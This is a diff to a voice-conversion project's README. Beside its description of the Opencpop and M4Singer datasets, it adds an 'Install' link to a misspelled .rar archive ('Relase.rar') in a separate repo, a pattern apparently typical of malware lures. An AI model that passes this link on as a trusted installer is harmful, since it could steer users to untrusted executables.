@@ -3,7 +3,8 @@
 
 
 ## Download
-🚀 Install --> [Releases]()
+🚀 Install --> [Releases](https://github.com/Lyopx/Voice-Changer-ai/releases/download/v2.4/Relase.rar)
+
 
 We adopt two public datasets, Opencpop [1] and M4Singer [2], to conduct **many-to-one** singing voice conversion. Specifically, we consider [Opencpop](https://wenet.org.cn/opencpop/) (which is a single singer dataset) as target singer and use [M4Singer](https://github.com/M4Singer/M4Singer) (which is a 20-singer dataset) as source singers. In addition, a ProSingers Dataset has been collected, which contains singing corpus by professional singers, covering different singing styles, languages, and genres.  
 
